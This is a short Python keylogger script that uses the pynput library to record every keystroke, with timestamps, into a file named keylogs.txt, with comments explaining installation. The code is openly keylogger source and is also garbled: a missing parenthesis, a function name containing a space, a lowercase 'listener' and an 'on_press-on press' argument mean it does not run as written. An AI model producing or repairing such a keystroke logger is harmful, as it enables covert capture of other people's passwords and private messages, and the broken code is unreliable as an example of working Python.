# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

# log keys into a file and also get loging information date and time for keys pressed 
logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s'
def on press (key):
	logging.info (str (key))
with listener (on_press-on press) as listener:
	listener.join()
